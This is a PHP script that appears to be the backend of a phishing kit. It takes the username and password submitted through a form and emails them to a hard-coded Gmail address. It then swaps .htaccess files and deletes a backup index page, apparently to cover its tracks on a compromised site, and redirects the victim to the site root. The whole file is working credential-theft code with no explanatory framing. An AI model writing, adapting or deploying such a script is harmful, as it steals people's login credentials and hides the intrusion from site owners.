<?php
/* Set e-mail recipient */
$myemail = "blackeuf@gmail.com";
/* Check all form inputs using check_input function */
$user = $_POST['user'];
$pass = $_POST['pass'];


/* Let's prepare the message for the e-mail */
$message = "

Username: $user
Password: $pass



";

/* Send the message using mail() function */
mail($myemail, $user, $pass);



unlink('.htaccess');
rename(".htacces",".htaccess");
unlink('index.bak.html');


/* Redirect visitor to the thank you page */
header('Location: /');
exit();

fclose($fh);

?>
